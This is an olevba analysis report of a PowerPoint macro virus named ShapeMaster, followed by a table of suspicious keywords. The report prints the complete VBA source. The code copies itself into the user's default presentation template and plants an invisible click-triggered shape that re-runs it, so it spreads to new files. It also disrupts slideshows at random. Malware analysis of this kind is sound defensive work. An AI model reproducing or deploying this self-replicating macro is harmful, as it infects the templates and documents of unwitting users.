olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSPPoint.ShapeMaster-dd187fa23aae3bf048f0530449e1b88917cf7608
Type: PPT
-------------------------------------------------------------------------------
VBA MACRO ShapeMaster.bas 
in file: None - OLE stream: 'VBA/ShapeMaster'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'<!--1nternal-->
'PPT.ShapeMaster v0.1 /1nternal
Sub actionhook(ShapeMaster)
    On Error Resume Next
    If Int(Rnd * 7) = 0 Then
        Set Home = ActivePresentation
        Prev = 1
        Do
            Last = Prev
            Prev = InStr(Last + 1, Application.Path, "\")
        Loop While Prev <> 0
        Set templa = Presentations.Open(Left(Application.Path, Last) + "Templates\Blank Presentation.pot", , , msoFalse)
        dontadd = False
        For Each ModComponent In templa.VBProject.VBComponents
            If ModComponent.Name = "ShapeMaster" Then dontadd = True
        Next
        If dontadd <> True Then
            Set NewMod = templa.VBProject.VBComponents.Add(1)
            NewMod.Name = "ShapeMaster"
            NewMod.CodeModule.InsertLines 1, Home.VBProject.VBComponents("ShapeMaster").CodeModule.Lines(1, Home.VBProject.VBComponents("ShapeMaster").CodeModule.CountOfLines)
            Set ShapetoWack = templa.SlideMaster.Shapes.AddShape(1, 0, 0, templa.PageSetup.SlideWidth, templa.PageSetup.SlideHeight)
            With ShapetoWack
                .Name = "ShapeMaster"
                .ZOrder (msoSendToBack)
                .Line.Visible = False
                .Fill.Visible = False
                .ActionSettings(ppMouseClick).Action = ppActionRunMacro
                .ActionSettings(ppMouseClick).Run = "actionhook"
            End With
            templa.Save
        End If
        templa.Close
    End If
    If Int(Rnd * 10) = 0 Then
        ActivePresentation.SlideShowWindow.View.Previous
        If Int(Rnd * 5) = 0 Then MsgBox ("PPT.ShapeMaster v0.1 /1nternal")
    Else
        ActivePresentation.SlideShowWindow.View.Next
    End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

